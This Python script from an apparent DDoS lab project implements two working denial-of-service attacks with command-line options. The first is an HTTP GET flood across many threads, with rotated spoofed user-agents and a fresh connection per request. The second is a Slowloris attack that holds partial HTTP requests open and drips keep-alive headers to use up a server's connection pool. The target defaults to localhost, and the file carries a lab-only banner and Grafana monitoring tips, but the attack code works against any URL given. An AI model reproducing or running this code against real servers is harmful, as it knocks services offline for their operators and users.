#!/usr/bin/env python3
"""
scripts/run_attack.py
─────────────────────────────────────────────────────────────────────────────
DDoS Attack Simulator — Phase 2 of the DDoS Simulation Project

Supported attack modes:
  • http_flood  – HTTP GET Flood: Saturate the server with maximum-speed
                  concurrent requests via a large thread pool.
                  → Effect: CPU spike, latency explosion, connection queuing,
                    eventual 503/504 errors.

  • slowloris   – Slowloris attack: Open many TCP connections and send
                  partial HTTP headers very slowly to exhaust Nginx's
                  `worker_connections` pool without using much bandwidth.
                  → Effect: Connection starvation, legitimate requests hang,
                    eventually get 502/504.

Usage:
  python scripts/run_attack.py --mode http_flood
  python scripts/run_attack.py --mode http_flood --workers 200 --duration 60
  python scripts/run_attack.py --mode slowloris --connections 150 --duration 60
  python scripts/run_attack.py --mode http_flood --url http://localhost/api/data --workers 100

Run ALONGSIDE legitimate_traffic.py in a second terminal to observe the contrast
on the Grafana dashboard at http://localhost:3000.
"""

import argparse
import io
import random
import socket
import sys
import time
import threading
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Force UTF-8 output on Windows to handle Unicode safely
if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("❌  pip install requests")
    sys.exit(1)

# ── ANSI colors (red/orange theme to distinguish from legit traffic) ──────────
RESET   = "\033[0m"
BOLD    = "\033[1m"
RED     = "\033[91m"
ORANGE  = "\033[33m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
GRAY    = "\033[90m"
MAGENTA = "\033[95m"
WHITE   = "\033[97m"
GREEN   = "\033[92m"

# ── Shared counters ───────────────────────────────────────────────────────────
_lock           = threading.Lock()
_req_sent       = 0
_req_success    = 0
_req_error      = 0
_req_timeout    = 0
_latencies      = deque(maxlen=500)
_status_counts  = {}
_attack_start   = 0.0
_stop_event     = threading.Event()

# ── Fake user-agents for variety ──────────────────────────────────────────────
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "python-requests/2.31.0",
    "curl/7.88.1",
    "Go-http-client/1.1",
    "Java/11.0.2",
    "axios/1.4.0",
    "okhttp/4.11.0",
    "Wget/1.21.3",
]

# ── Attack session factory ────────────────────────────────────────────────────
def create_attack_session() -> requests.Session:
    """Each worker gets its own session - no shared pool bottleneck."""
    session = requests.Session()
    adapter = HTTPAdapter(
        max_retries=Retry(total=0),
        pool_connections=1,
        pool_maxsize=1,
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    # Disable keepalive so each request uses a fresh TCP connection
    # This maximizes connection count visible to nginx (realistic flood)
    session.headers.update({"Connection": "close"})
    return session


# ═══════════════════════════════════════════════════════════════════════════════
#  MODE 1: HTTP FLOOD
# ═══════════════════════════════════════════════════════════════════════════════

def _http_flood_worker(url: str, worker_id: int) -> None:
    """Single worker: each has its own session, hammers URL as fast as possible."""
    global _req_sent, _req_success, _req_error, _req_timeout

    # Own session → avoids shared pool bottleneck with 150 workers
    session = create_attack_session()

    while not _stop_event.is_set():
        ua = random.choice(_USER_AGENTS)
        headers = {"User-Agent": ua, "X-Attack-Worker": str(worker_id)}

        try:
            t0 = time.monotonic()
            r = session.get(url, headers=headers, timeout=5)
            elapsed = (time.monotonic() - t0) * 1000

            with _lock:
                _req_sent   += 1
                _req_success += 1
                _latencies.append(elapsed)
                _status_counts[r.status_code] = _status_counts.get(r.status_code, 0) + 1

        except requests.exceptions.Timeout:
            with _lock:
                _req_sent    += 1
                _req_timeout += 1
                _status_counts["TIMEOUT"] = _status_counts.get("TIMEOUT", 0) + 1

        except requests.exceptions.ConnectionError:
            with _lock:
                _req_sent  += 1
                _req_error += 1
                _status_counts["CONN_ERR"] = _status_counts.get("CONN_ERR", 0) + 1

        except Exception:
            with _lock:
                _req_sent  += 1
                _req_error += 1


def run_http_flood(url: str, num_workers: int, duration: int) -> None:
    """Launch HTTP flood with `num_workers` concurrent threads for `duration` seconds."""

    print(f"\n  {RED}{BOLD}🔥  HTTP FLOOD STARTING{RESET}")
    print(f"  Target   : {CYAN}{url}{RESET}")
    print(f"  Workers  : {RED}{BOLD}{num_workers} concurrent threads{RESET}")
    print(f"  Duration : {ORANGE}{duration}s{RESET}")
    print(f"\n  {GRAY}Tip: Watch Grafana at http://localhost:3000 — you should see{RESET}")
    print(f"  {GRAY}     Request Rate spike + Latency explosion + 5xx errors appear.{RESET}")
    print(f"\n  {RED}{'─'*60}{RESET}")

    # Each worker creates its own session inside _http_flood_worker()
    with ThreadPoolExecutor(max_workers=num_workers) as executor:
        futures = [
            executor.submit(_http_flood_worker, url, i + 1)
            for i in range(num_workers)
        ]

        deadline = time.monotonic() + duration
        try:
            while time.monotonic() < deadline and not _stop_event.is_set():
                _print_attack_stats(mode="HTTP Flood", workers=num_workers)
                time.sleep(2)
        except KeyboardInterrupt:
            pass
        finally:
            _stop_event.set()

    _print_final_summary(mode="HTTP Flood")


# ═══════════════════════════════════════════════════════════════════════════════
#  MODE 2: SLOWLORIS
# ═══════════════════════════════════════════════════════════════════════════════

class SlowlorisSocket:
    """One Slowloris 'slow connection' — opens socket, sends headers drip-by-drip."""

    def __init__(self, host: str, port: int, sock_id: int):
        self.host   = host
        self.port   = port
        self.sock_id= sock_id
        self.sock   = None
        self._create()

    def _create(self) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.host, self.port))
            # Send a partial HTTP request — just the first line + some headers
            s.send(f"GET /api/data?sid={self.sock_id} HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.host}\r\n".encode())
            s.send(f"User-Agent: {random.choice(_USER_AGENTS)}\r\n".encode())
            s.send("Accept-language: en-US,en\r\n".encode())
            # DO NOT send the final \r\n — this keeps the request "in progress"
            self.sock = s

            with _lock:
                global _req_sent, _req_success
                _req_sent   += 1
                _req_success += 1
                _status_counts["HELD"] = _status_counts.get("HELD", 0) + 1

            return True
        except Exception:
            self.sock = None
            with _lock:
                global _req_error
                _req_error += 1
            return False

    def keep_alive(self) -> bool:
        """Send a harmless extra header to prevent timeout."""
        if self.sock is None:
            return self._create()
        try:
            # Send another header byte to reset server-side timeout counter
            self.sock.send(f"X-Keepalive: {int(time.time())}\r\n".encode())
            return True
        except Exception:
            self.sock = None
            return self._create()   # Re-open connection

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None


def run_slowloris(host: str, port: int, num_connections: int, duration: int,
                  keep_alive_interval: int = 10) -> None:
    """Open `num_connections` partial HTTP sockets and hold them open."""

    print(f"\n  {RED}{BOLD}🐌  SLOWLORIS ATTACK STARTING{RESET}")
    print(f"  Target      : {CYAN}{host}:{port}{RESET}")
    print(f"  Connections : {RED}{BOLD}{num_connections} slow sockets{RESET}")
    print(f"  Duration    : {ORANGE}{duration}s{RESET}")
    print(f"  Keep-alive  : every {keep_alive_interval}s")
    print(f"\n  {GRAY}Effect: Nginx worker_connections pool exhausted → legit requests{RESET}")
    print(f"  {GRAY}        will hang or receive 502 Bad Gateway.{RESET}")
    print(f"\n  {RED}{'─'*60}{RESET}")

    print(f"\n  {ORANGE}[*] Opening {num_connections} slow connections...{RESET}", flush=True)
    sockets: list[SlowlorisSocket] = []

    for i in range(num_connections):
        if _stop_event.is_set():
            break
        sl = SlowlorisSocket(host, port, i)
        sockets.append(sl)
        if (i + 1) % 10 == 0:
            sys.stdout.write(f"\r  {ORANGE}Opened {i+1}/{num_connections} sockets{RESET}   ")
            sys.stdout.flush()
        time.sleep(0.02)    # Small delay between opens to avoid OS limits

    print(f"\n  {RED}{BOLD}[!] {len(sockets)} slow connections active — holding...{RESET}\n")

    deadline = time.monotonic() + duration
    last_keepalive = time.monotonic()

    try:
        while time.monotonic() < deadline and not _stop_event.is_set():
            _print_attack_stats(mode="Slowloris", workers=len(sockets))

            # Periodically send keep-alive drips
            if time.monotonic() - last_keepalive >= keep_alive_interval:
                alive_count = 0
                dead_count  = 0
                for sl in sockets:
                    if sl.keep_alive():
                        alive_count += 1
                    else:
                        dead_count += 1
                last_keepalive = time.monotonic()
                ts = datetime.now().strftime("%H:%M:%S")
                print(
                    f"  {GRAY}[{ts}]{RESET} "
                    f"{ORANGE}Keep-alive ping:{RESET} "
                    f"{GREEN}{alive_count} alive{RESET} | "
                    f"{RED}{dead_count} dead/reopened{RESET}"
                )

            time.sleep(2)

    except KeyboardInterrupt:
        pass
    finally:
        _stop_event.set()
        print(f"\n  {ORANGE}[*] Closing all sockets...{RESET}")
        for sl in sockets:
            sl.close()

    _print_final_summary(mode="Slowloris")


# ═══════════════════════════════════════════════════════════════════════════════
#  STATS DISPLAY
# ═══════════════════════════════════════════════════════════════════════════════

def _print_attack_stats(mode: str, workers: int) -> None:
    with _lock:
        sent    = _req_sent
        success = _req_success
        errors  = _req_error
        timeouts= _req_timeout
        lats    = list(_latencies)
        counts  = dict(_status_counts)

    elapsed = time.monotonic() - _attack_start
    rps     = sent / elapsed if elapsed > 0 else 0
    err_pct = ((errors + timeouts) / sent * 100) if sent > 0 else 0

    ts = datetime.now().strftime("%H:%M:%S")

    avg_lat = (sum(lats) / len(lats)) if lats else 0
    max_lat = max(lats) if lats else 0

    # Build status breakdown string
    status_str = "  ".join(
        f"{RED if isinstance(c, str) or (isinstance(c, int) and c >= 400) else ORANGE}"
        f"{c}={n}{RESET}"
        for c, n in sorted(counts.items(), key=lambda x: str(x[0]))
    )

    print(
        f"  {GRAY}[{ts}]{RESET} "
        f"{RED}{BOLD}⚡ ATTACK{RESET} [{mode}] "
        f"workers={ORANGE}{workers}{RESET} "
        f"sent={WHITE}{BOLD}{sent:,}{RESET} "
        f"rps={RED}{BOLD}{rps:.0f}{RESET} "
        f"err%={RED}{err_pct:.1f}%{RESET} "
        f"lat_avg={ORANGE}{avg_lat:.0f}ms{RESET} "
        f"lat_max={RED}{max_lat:.0f}ms{RESET}"
    )
    if status_str:
        print(f"           {GRAY}status: {status_str}{RESET}")


def _print_final_summary(mode: str) -> None:
    with _lock:
        sent    = _req_sent
        success = _req_success
        errors  = _req_error
        timeouts= _req_timeout
        lats    = list(_latencies)
        counts  = dict(_status_counts)

    elapsed = time.monotonic() - _attack_start
    avg_rps = sent / elapsed if elapsed > 0 else 0
    avg_lat = (sum(lats) / len(lats)) if lats else 0
    max_lat = max(lats) if lats else 0

    print()
    print(f"  {RED}{'═'*60}{RESET}")
    print(f"  {RED}{BOLD}💀  ATTACK COMPLETE — FINAL SUMMARY [{mode}]{RESET}")
    print(f"  {RED}{'═'*60}{RESET}")
    print(f"  Duration      : {elapsed:.1f}s")
    print(f"  Total Sent    : {WHITE}{BOLD}{sent:,}{RESET}")
    print(f"  Avg RPS       : {RED}{BOLD}{avg_rps:.0f} req/s{RESET}")
    print(f"  Successful    : {GREEN}{success:,}{RESET}")
    print(f"  Errors        : {RED}{errors:,}{RESET}")
    print(f"  Timeouts      : {ORANGE}{timeouts:,}{RESET}")
    print(f"  Avg Latency   : {ORANGE}{avg_lat:.1f}ms{RESET}")
    print(f"  Max Latency   : {RED}{max_lat:.1f}ms{RESET}")
    if counts:
        print(f"  Status Counts :", end="")
        for code, cnt in sorted(counts.items(), key=lambda x: str(x[0])):
            print(f"  {code}={cnt}", end="")
        print()
    print(f"  {RED}{'═'*60}{RESET}")
    print(f"\n  {YELLOW}✅  System is back to normal — watch Grafana for recovery.{RESET}\n")


# ═══════════════════════════════════════════════════════════════════════════════
#  BANNER
# ═══════════════════════════════════════════════════════════════════════════════

def _print_banner(mode: str, url: str, workers_or_conns: int, duration: int) -> None:
    print()
    print(f"  {RED}{BOLD}╔══════════════════════════════════════════════════════╗{RESET}")
    print(f"  {RED}{BOLD}║  💀 DDoS Sim – Phase 2: ATTACK SIMULATOR             ║{RESET}")
    print(f"  {RED}{BOLD}║     FOR EDUCATIONAL/LAB USE ONLY                     ║{RESET}")
    print(f"  {RED}{BOLD}╚══════════════════════════════════════════════════════╝{RESET}")
    print()
    print(f"  Mode     : {RED}{BOLD}{mode.upper()}{RESET}")
    print(f"  Target   : {CYAN}{url}{RESET}")
    print(f"  Scale    : {RED}{BOLD}{workers_or_conns}{RESET} {'workers' if mode == 'http_flood' else 'connections'}")
    print(f"  Duration : {ORANGE}{duration}s{RESET}")
    print()
    print(f"  {GRAY}⚠  Open Grafana (http://localhost:3000) in another window.")
    print(f"     Dashboard: DDoS Sim → Phase 1: Base Infrastructure")
    print(f"     Watch: Request Rate, Latency, Error Rate panels.{RESET}")
    print()

    # Countdown
    for i in range(3, 0, -1):
        print(f"  {RED}{BOLD}  Starting in {i}...{RESET}", end="\r", flush=True)
        time.sleep(1)
    print(f"  {RED}{BOLD}  🔥 ATTACK LAUNCHED!          {RESET}")


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main() -> None:
    parser = argparse.ArgumentParser(
        description="DDoS Attack Simulator — Phase 2 (Educational Lab Use Only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # HTTP Flood with 100 workers for 30 seconds
  python scripts/run_attack.py --mode http_flood --workers 100 --duration 30

  # HTTP Flood with 300 workers for 60 seconds (intense)
  python scripts/run_attack.py --mode http_flood --workers 300 --duration 60

  # Slowloris with 150 connections for 60 seconds
  python scripts/run_attack.py --mode slowloris --connections 150 --duration 60

Run legitimate_traffic.py in a SEPARATE terminal first, then launch this script.
        """
    )
    parser.add_argument(
        "--mode", choices=["http_flood", "slowloris"], default="http_flood",
        help="Attack mode: http_flood (default) or slowloris"
    )
    parser.add_argument(
        "--url", default="http://127.0.0.1/api/data",
        help="Target URL (default: http://127.0.0.1/api/data)"
    )
    parser.add_argument(
        "--workers", type=int, default=100,
        help="[http_flood] Number of concurrent threads (default: 100)"
    )
    parser.add_argument(
        "--connections", type=int, default=150,
        help="[slowloris] Number of slow connections to open (default: 150)"
    )
    parser.add_argument(
        "--duration", type=int, default=30,
        help="Attack duration in seconds (default: 30)"
    )
    parser.add_argument(
        "--keepalive-interval", type=int, default=10,
        help="[slowloris] Seconds between keep-alive drips (default: 10)"
    )
    args = parser.parse_args()

    # Parse host/port from URL for Slowloris raw socket
    from urllib.parse import urlparse
    parsed = urlparse(args.url)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    scale = args.workers if args.mode == "http_flood" else args.connections
    _print_banner(mode=args.mode, url=args.url, workers_or_conns=scale, duration=args.duration)

    global _attack_start
    _attack_start = time.monotonic()

    try:
        if args.mode == "http_flood":
            run_http_flood(
                url=args.url,
                num_workers=args.workers,
                duration=args.duration,
            )
        elif args.mode == "slowloris":
            run_slowloris(
                host=host,
                port=port,
                num_connections=args.connections,
                duration=args.duration,
                keep_alive_interval=args.keepalive_interval,
            )
    except KeyboardInterrupt:
        _stop_event.set()
        print(f"\n  {YELLOW}⚠  Interrupted. Cleaning up...{RESET}")
        _print_final_summary(mode=args.mode)
        sys.exit(0)


if __name__ == "__main__":
    main()
